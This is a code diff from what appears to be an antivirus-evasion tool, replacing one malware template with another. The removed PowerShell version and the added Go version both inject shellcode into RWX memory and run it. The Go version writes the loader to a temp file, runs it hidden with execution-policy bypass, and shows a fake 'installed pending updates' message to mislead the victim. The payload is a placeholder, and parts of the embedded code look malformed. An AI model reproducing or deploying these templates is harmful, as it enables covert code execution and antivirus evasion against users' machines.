@@ -1398,40 +1398,105 @@ func checkerr(err error) {
 }
 `
 
-var AvBusterPowerShellCustomShellCode = `# our execute x86 shellcode
-function Generate-ShellcodeExec
-{
-# this is our shellcode injection into memory (one liner)
-$shellcode_string = @"
-RPL$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';RPL$winFunc = Add-Type -memberDefinition RPL$code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]RPL$sc64 = SHELLCODE
-;[Byte[]]RPL$sc = RPL$sc64;RPL$size = 0x1000;if (RPL$sc.Length -gt 0x1000) {RPL$size = RPL$sc.Length};RPL$x=RPL$winFunc::VirtualAlloc(0,0x1000,RPL$size,0x40);for (RPL$i=0;RPL$i -le (RPL$sc.Length-1);RPL$i++) {RPL$winFunc::memset([IntPtr](RPL$x.ToInt32()+RPL$i), RPL$sc[RPL$i], 1)};RPL$winFunc::CreateThread(0,0,RPL$x,0,0,0);for (;;) { Start-sleep 60 };
+var AvBusterPowerShellCustomShellCode = `package main
+
+import (
+	"fmt"
+	"os"
+	"os/exec"
+	"strings"
+)
+
+var (
+	err                     error
+	powershellcore, cmdname string
+)
+
+func init() {
+	powershellcore = RPL$code = @"
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);
 "@
-$goat =  [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($shellcode_string)) 
-write-output $goat
+	
+	$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru
+	
+	# 32-bit payload
+	# msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread
+	[byte[]]$byteArray = [System.Convert]::FromBase64String("SHELLCODE")
+	[Byte[]]$sc32 = $byteArray
+	
+	# 64-bit payload
+	# msfpayload windows/x64/exec CMD="cmd /k calc" EXITFUNC=thread
+	[Byte[]]$sc64 = $byteArray
+	
+	# Determine if Powershell is running as 32 or 64 bit
+	[Byte[]]$sc = $sc32
+	if ([IntPtr]::Size -eq 8) {$sc = $sc64}
+	
+	# Calculate correct size param for VirtualAlloc
+	$size = 0x1000
+	if ($sc.Length -gt 0x1000) {$size = $sc.Length}
+	
+	# Allocate a page of memory. This will only work if the size parameter (3rd param) is at least 0x1000.
+	# Allocate RWX memory block
+	$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40)
+	
+	# I could have more easily used memcpy but that would have required the use of a particular .NET class to cast $sc as an IntPtr. I wanted to get this working without needing additional .NET classes. I prefer to KISS (keep it simple, stupid).
+	for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}
+	
+	# Execute you payload
+	$winFunc::CreateThread(0,0,$x,0,0,0)RPL
 }
 
-# our function for executing x86 shellcode
-function Execute-x86
-{
-	# if we are running under AMD64 then use the x86 version of powershell
-    if($env:PROCESSOR_ARCHITECTURE -eq "AMD64")
-    {
-        $powershellx86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell.exe"
-		$cmd = "-noprofile -windowstyle hidden -noninteractive -EncodedCommand"
-		$thegoat = Generate-ShellcodeExec
-        iex "& $powershellx86 $cmd $thegoat"
-		
-    }
-	# else just run normally
-    else
-    {
-        $thegoat = Generate-ShellcodeExec
-		$cmd = "-noprofile -windowstyle hidden -noninteractive -EncodedCommand"
-		iex "& powershell $cmd $thegoat"
-    }
+func os64check() bool {
+
+	for _, e := range os.Environ() {
+		pair := strings.Split(e, "=")
+
+		if pair[0] == "PROCESSOR_ARCHITEW6432" || strings.Contains(pair[1], "64") {
+			fmt.Println(pair[0] + "=" + pair[1])
+			return true
+		}
+	}
+	return false
 }
-# call the function
-Execute-x86`
+
+func main() {
+	genereaterevshellscript()
+	if os64check() {
+		cmdname = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
+
+	} else {
+
+		cmdname = "PowerShell"
+	}
+
+	cmdArgs := []string{"-w", "hidden", "-ep", "bypass", "-nop", "-c", "IEX (C://Windows//Temp//powrev.ps1)"}
+	cmd := exec.Command(cmdname, cmdArgs...)
+	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	err := cmd.Start()
+	checkerr(err)
+	fmt.Println("Successfully installed pending updates !")
+}
+
+func genereaterevshellscript() {
+	
+	fopowershellrevshell, err := os.Create("C://Windows//Temp//powrev.ps1")
+	checkerr(err)
+	defer fopowershellrevshell.Close()
+	fopowershellrevshell.WriteString(powershellcore)
+}
+
+func checkerr(err error) {
+	if err != nil {
+		fmt.Printf("something went wrong %s", err)
+		return
+	}
+}`
 
 var AvBusterEncryptedShellCode = `package main
 
